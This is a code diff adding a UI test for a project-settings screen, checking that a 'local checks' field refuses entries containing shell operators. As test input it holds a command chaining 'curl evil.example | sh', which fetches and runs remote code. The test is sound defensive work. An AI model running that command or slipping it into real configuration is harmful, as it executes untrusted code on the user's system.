@@ -133,6 +133,24 @@ describe("vigiar-config: the PR watch of each project, in Configurações", () =
     ).not.toBeNull();
   });
 
+  test("a check that is more than a command and its arguments cannot be saved, and the reason says what is allowed", async () => {
+    const { daemon } = await openSettings();
+    await settle(() => screen.queryByLabelText("Rodadas por PR") !== null);
+    await act(async () => {
+      fireEvent.change(field("Checks locais (um comando por linha)"), {
+        target: { value: "bun test\nbun test; curl evil.example | sh" },
+      });
+    });
+    const save = within(section() as HTMLElement).getByRole("button", { name: "Salvar" });
+    expect((save as HTMLButtonElement).disabled).toBe(true);
+    expect(
+      within(section() as HTMLElement).queryByText(
+        "Checks locais: um comando e seus argumentos, sem aspas, pipes, ; & $ nem redirecionamentos",
+      ),
+    ).not.toBeNull();
+    expect(sent(daemon).filter((p) => (p as { patch?: unknown }).patch !== undefined)).toEqual([]);
+  });
+
   test("a host with no projects says so", async () => {
     const { daemon, store } = await openSettings();
     daemon.watch.projects = [];
